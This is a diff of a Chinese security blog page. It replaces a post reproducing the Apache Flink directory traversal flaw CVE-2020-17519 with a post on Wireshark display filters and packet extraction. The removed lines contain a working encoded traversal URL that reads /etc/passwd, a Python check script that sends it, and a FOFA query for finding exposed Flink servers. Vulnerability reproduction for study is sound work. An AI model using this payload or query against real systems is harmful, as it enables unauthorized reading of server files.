@@ -4,10 +4,10 @@
     <meta charset="utf-8">
     
     
-    <title>Apache Flink目录遍历漏洞 | Wisejay | To be better</title>
+    <title>wireshark流量分析 | Wisejay | To be better</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-    <meta name="keywords" content="漏洞复现">
+    <meta name="keywords" content="其他">
     <link rel="shortcut icon" href="/img/favicon.ico">
     <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
     <link rel="stylesheet" href="/css/style.css?v=1.4.2">
@@ -138,7 +138,7 @@
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">
-            <span>Apache Flink目录遍历漏洞</span>
+            <span>wireshark流量分析</span>
             
         </div>
         
@@ -151,15 +151,15 @@
 <header class="content-header post-header">
     <img src="/img/banner.jpg" class="header-bg">
     <div class="container fade-scale">
-        <h1 class="title">Apache Flink目录遍历漏洞</h1>
+        <h1 class="title">wireshark流量分析</h1>
         <h5 class="subtitle">
             
-                <time datetime="2021-02-19T14:55:02.703Z" itemprop="datePublished" class="page-time">
-  2021-02-19
+                <time datetime="2021-02-21T10:23:15.776Z" itemprop="datePublished" class="page-time">
+  2021-02-21
 </time>
 
 
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li></ul>
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/其他/">其他</a></li></ul>
 
             
         </h5>
@@ -184,15 +184,15 @@
 
 
 <div class="container body-wrap">
-    <article id="post-CVE-2020-17519"
+    <article id="post-wireshark流量分析"
   class="post-article article-type-post" itemprop="blogPost">
     <div class="post-card">
-        <h1 class="post-card-title">Apache Flink目录遍历漏洞</h1>
+        <h1 class="post-card-title">wireshark流量分析</h1>
         <div class="post-meta">
-            <time class="post-time" title="2021-02-19 22:55:02" datetime="2021-02-19T14:55:02.703Z"  itemprop="datePublished">2021-02-19</time>
+            <time class="post-time" title="2021-02-21 18:23:15" datetime="2021-02-21T10:23:15.776Z"  itemprop="datePublished">2021-02-21</time>
 
             
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li></ul>
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/其他/">其他</a></li></ul>
 
 
 
@@ -205,25 +205,131 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             
-            <h1 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h1><h2 id="Apache-Flink简介"><a href="#Apache-Flink简介" class="headerlink" title="Apache Flink简介"></a>Apache Flink简介</h2><p><code>Apache Flink是一个开源流处理框架，具有强大的流处理和批处理功能</code></p>
-<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>Apache Flink 1.11.0中引入的一个更改，使攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p>
-<p>影响版本：<code>1.11.0</code>、<code>1.11.1</code>、<code>1.11.2</code></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub上面有提供环境<code>https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519</code>这里不搭建了，直接网上找一个来进行测试。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Apache Flink" &amp;&amp; country!="CN"</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Payload</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
-
+            <h1 id="wireshark流量分析"><a href="#wireshark流量分析" class="headerlink" title="wireshark流量分析"></a>wireshark流量分析</h1><h2 id="wireshark基本使用"><a href="#wireshark基本使用" class="headerlink" title="wireshark基本使用"></a>wireshark基本使用</h2><p><strong>过滤符号</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">英文</th>
+<th align="center">符号</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">eq</td>
+<td align="center">==</td>
+<td align="center">等于</td>
+</tr>
+<tr>
+<td align="center">ne</td>
+<td align="center">!=</td>
+<td align="center">不等于</td>
+</tr>
+<tr>
+<td align="center">gt</td>
+<td align="center">&gt;</td>
+<td align="center">大于</td>
+</tr>
+<tr>
+<td align="center">lt</td>
+<td align="center">&lt;</td>
+<td align="center">小于</td>
+</tr>
+<tr>
+<td align="center">ge</td>
+<td align="center">&gt;=</td>
+<td align="center">大于等于</td>
+</tr>
+<tr>
+<td align="center">le</td>
+<td align="center">&lt;=</td>
+<td align="center">小于等于</td>
+</tr>
+<tr>
+<td align="center">contains</td>
+<td align="center"></td>
+<td align="center">包含</td>
+</tr>
+<tr>
+<td align="center">matches</td>
+<td align="center">~</td>
+<td align="center">正则匹配</td>
+</tr>
+<tr>
+<td align="center">bitwise_and</td>
+<td align="center">&amp;</td>
+<td align="center">位与</td>
+</tr>
+</tbody></table>
+<h3 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h3><ul>
+<li>根据IP地址筛选<ul>
+<li>筛选源IP：<code>ip.src == ip地址</code></li>
+<li>筛选目标IP：<code>ip.dst == ip地址</code></li>
+<li>筛选源和目的IP：<code>ip.addr ==ip地址</code></li>
+</ul>
+</li>
+<li>根据mac地址筛选<ul>
+<li>筛选源mac：<code>eth.src == mac地址</code></li>
+<li>筛选目标mac：<code>eth.dst == mac地址</code></li>
+<li>筛选源和目的mac：<code>eth.addr == mac地址</code></li>
+</ul>
+</li>
+<li>根据端口筛选<ul>
+<li>筛选源端口 ：<code>tcp.srcport == 端口号</code>、<code>udp.srcport == 端口号</code></li>
+<li>筛选目的端口：<code>tcp.dstport == 端口号</code>、<code>udp.dstport == 端口号</code></li>
+<li>筛选源和目标的端口：<code>tcp.port == 端口号</code>、<code>udp.port == 端口号</code></li>
+</ul>
+</li>
+<li>根据协议筛选<ul>
+<li>筛选协议：<code>协议号</code></li>
+<li>筛选tcp：<code>tcp</code></li>
+<li>筛选udp：<code>udp</code></li>
+<li>筛选ip：<code>ip</code></li>
+<li>筛选http：<code>http</code></li>
+<li>筛选arp：<code>arp</code></li>
+</ul>
+</li>
+<li>根据包长度筛选<ul>
+<li>筛选协议包长度：<code>协议.len == 长度</code></li>
+<li>筛选UDP长度：<code>udp.length &gt;= 长度</code></li>
+<li>筛选TCP长度：<code>tcp.len &lt;= 长度</code></li>
+<li>筛选ip长度：<code>ip.len == 长度</code></li>
+</ul>
+</li>
+<li>HTTP筛选<ul>
+<li>筛选请求GET方法：<code>http.request.method == GET</code>、GET要大写</li>
+<li>筛选请求POST方法：<code>http.request.method == POST</code>、POST要大写</li>
+<li>筛选指定URI：<code>http.request.uri == &quot;/admin&quot;</code></li>
+<li>筛选指定包含内容：<code>http contains &quot;text&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h3><p>按<code>Ctrl+F</code>调出搜索框进行搜索</p>
 <figure class="image-box">
-                <a rel=Apache Flink目录遍历漏洞 href="/img/CVE-2020-17519/image-20210206124042133.png" title="image-20210206124042133" data-fancybox="images"><img src="/img/CVE-2020-17519/image-20210206124042133.png" alt="image-20210206124042133" title class></a>
-                <p>image-20210206124042133</p>
+                <a rel=wireshark流量分析 href="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202131541280.png" title="image-20210202131541280" data-fancybox="images"><img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202131541280.png" alt="image-20210202131541280" title class></a>
+                <p>image-20210202131541280</p>
             </figure>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'</span></span><br><span class="line">    url = addr+payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.request(<span class="string">"GET"</span>,url=url,timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'root'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(addr+<span class="string">"存在漏洞"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">verify(<span class="string">"addr"</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>选中准备还原数据包，右键选择追踪流，选择对应的流</p>
+<figure class="image-box">
+                <a rel=wireshark流量分析 href="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202173315749.png" title="image-20210202173315749" data-fancybox="images"><img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202173315749.png" alt="image-20210202173315749" title class></a>
+                <p>image-20210202173315749</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=wireshark流量分析 href="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202173401106.png" title="image-20210202173401106" data-fancybox="images"><img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202173401106.png" alt="image-20210202173401106" title class></a>
+                <p>image-20210202173401106</p>
+            </figure>
+
+<h3 id="数据包提取"><a href="#数据包提取" class="headerlink" title="数据包提取"></a>数据包提取</h3><p>在分组详细中选中右键导出字节流分组保存即可</p>
+<figure class="image-box">
+                <a rel=wireshark流量分析 href="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202195432801.png" title="image-20210202195432801" data-fancybox="images"><img src="/img/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20210202195432801.png" alt="image-20210202195432801" title class></a>
+                <p>image-20210202195432801</p>
+            </figure>
 
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
-<li><a href="https://mp.weixin.qq.com/s/oxNb_FolmgeSaMPUP_qE-w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oxNb_FolmgeSaMPUP_qE-w</a></li>
-<li><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/112260367" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/112260367</a></li>
+<li><a href="https://www.wireshark.org/docs/wsug_html/#DispCompOps" target="_blank" rel="noopener">https://www.wireshark.org/docs/wsug_html/#DispCompOps</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/36179402" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36179402</a></li>
+<li><a href="https://www.cnblogs.com/jiugao/p/11644508.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiugao/p/11644508.html</a></li>
 </ol>
 
         </div>
@@ -232,12 +338,12 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2021-02-19T15:00:07.671Z" itemprop="dateUpdated">2021-02-19 23:00:07</time>
+    Last updated: <time datetime="2021-02-21T10:25:19.877Z" itemprop="dateUpdated">2021-02-21 18:25:19</time>
 </span><br>
 
 
         
-        转载注明出处，原文地址：<a href="/2021/02/19/CVE-2020-17519/" target="_blank" rel="external">http://wisejay.xyz/2021/02/19/CVE-2020-17519/</a>
+        转载注明出处，原文地址：<a href="/2021/02/21/wireshark流量分析/" target="_blank" rel="external">http://wisejay.xyz/2021/02/21/wireshark流量分析/</a>
         
     </div>
     <footer>
@@ -257,7 +363,7 @@
         
         <div class="post-footer">
             
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/其他/">其他</a></li></ul>
 
             <div class="page-share-wrap">
     
@@ -266,7 +372,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/02/19/CVE-2020-17519/&title=《Apache Flink目录遍历漏洞》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/02/21/wireshark流量分析/&title=《wireshark流量分析》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -278,7 +384,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/02/19/CVE-2020-17519/&title=《Apache Flink目录遍历漏洞》 — Wisejay&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/02/21/wireshark流量分析/&title=《wireshark流量分析》 — Wisejay&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -301,21 +407,14 @@
         
     </div>
     
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="prev">
-      <a href="/2021/02/21/wireshark流量分析/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">wireshark流量分析</h4>
-      </a>
-    </div>
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
   
 
   
     <div class="next">
-      <a href="/2021/02/07/CVE-2020-13942/" id="post-next" class="post-nav-link">
+      <a href="/2021/02/19/CVE-2020-17519/" id="post-next" class="post-nav-link">
         <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">Apache Unomi 远程代码执行漏洞</h4>
+        <h4 class="title">Apache Flink目录遍历漏洞</h4>
       </a>
     </div>
   
@@ -327,7 +426,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CVE-2020-17519"><span class="post-toc-number">1.</span> <span class="post-toc-text">CVE-2020-17519</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Apache-Flink简介"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Apache Flink简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞产生"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">漏洞产生</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#环境搭建"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">环境搭建</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考链接"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">参考链接</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#wireshark流量分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">wireshark流量分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#wireshark基本使用"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">wireshark基本使用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据包筛选"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">数据包筛选</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据包搜索"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">数据包搜索</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据包还原"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">数据包还原</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据包提取"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">数据包提取</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考链接"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">参考链接</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
@@ -406,7 +505,7 @@
     <ul class="reset share-icons">
       
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/02/19/CVE-2020-17519/&title=《Apache Flink目录遍历漏洞》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.xyz/2021/02/21/wireshark流量分析/&title=《wireshark流量分析》 — Wisejay&pic=http://wisejay.xyz/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -418,7 +517,7 @@
       </li>
       
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/02/19/CVE-2020-17519/&title=《Apache Flink目录遍历漏洞》 — Wisejay&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.xyz/2021/02/21/wireshark流量分析/&title=《wireshark流量分析》 — Wisejay&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -430,7 +529,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3ay26DQAwF0Pz/T6dSV91Arm2QGnNmhVoCc1hYfszrFa/37/p7/fcv5/cf/ep9ul53LAwMjK9lJI+rPrr62/P3RlQMDIwHMPKtVMPi+UdJ/psEdAwMDIzqVvLPkV9jYGBg9NK7o2K1WmNiYGBgJIzk0b3WWNJ6u6Alh4GBsZoxaZ/dfX37fAMDA+PfM97jlWziPIAm93zYAwYGxmrGpNGfl6y90WZ5jIqBgbGU0WuNJU/I33UBEgMDYzVjkq7lYbF31Cwfi2JgYDyBUe1i9Zr71cFn/i4MDIzdjF5DLd90fp2E16jRhoGBsZSRFJO9llzyqySV/LAfDAyM1YxqEdsrU3tNvRvbbRgYGF/IKKdiraSwd0Qjvx8DA2Mro9p8z1PJaxPNDx8XAwPjwYzzwDeZOfTafIdJJwYGxmrGZOY5mZRWQ3z0ZAwMjKWMfHw4aZPlgbU3fsDAwNjNmLfYkhfkoTlv0h3uBAMDYykjL0qrBWd1PFAdDGBgYDyNkReZyaGK/PBENUE8DPcYGBiPZMzTtXy0mSeRH5puGBgYSxlJWlZdzTHk+LAaBgbGPsa7uHqlbLLpUfjGwMBYzZgH0DxM58XqHcEaAwPj2xl5kK0WvZO0MhkhYGBgPI3ROzAxP34x52FgYGBM2vp5+lg9xYaBgYFxR9mZjx4vqLMxMDCWMvJhQPUJOWY0DMDAwFjNuCooV1/ca6uNWnsYGBjfx/gB0UsD8Wc/ILMAAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACIklEQVR42u3ay24CMRAEQP7/p4mUK4J0jxcU7NoTSvZVe2jNeHy7xcf993j8nZxzfzie/f3xnIsPDAyMr2Ukt8sf/+xVXr/cBVQMDIwDGG3Ivn7kLBtn4Y6BgYGRBOJ6EGNgYGBcG7h52ff6zKSIxMDAwGib2PZ18zD9aC+OgYHxhYyVwcC7f39ovoGBgfGPGfeFI4/aJFhX3gcDA2NvRrugv97cttcWQYyBgbEpY32hrY3RGfKPT4+BgXEAo31MWyYm2Zh/lNvsK2JgYHwtoy3RkhCcFZRFvCaTWAwMjI0YsyZzFqNtWuaLdBgYGCcwks0NsxniVS3uH1dhYGAcwGgX4tfPacEYGBgnMxJAMgyYVWj1i74uRjEwMLZmtMv6baM7i9S2AMXAwDiB0T4yX3RLGtRZKNerdxgYGF/IuAdHPnRcaUrzcvPpCBMDA+MARrvRoY3dq6gYGBinMZLYnW3Vau/ZRnBdIGJgYGzByC9rl+HaOG5bXwwMjHMYK9sj8gX92VpZMQzAwMA4kjEbZOYxvV56YmBgnMBY2oZVLsBFr7IQ3xgYGPsxLijI4ua23VJWtNMYGBhbM9qYmwVo3hKvPwsDA2NXxsq2sHapri3+isDFwMA4gDEbKM5Ktzd24RgYGBhBIOb/TT7KcFsYBgbGwYx8A9lswHBZn42BgbEpo43LNkzzGG23nWFgYJzAmA0GWmr7+ZI7XzDfwMDA+O+MHwN1+ghSOZDSAAAAAElFTkSuQmCC" alt="微信分享二维码">
 </div>
 
 
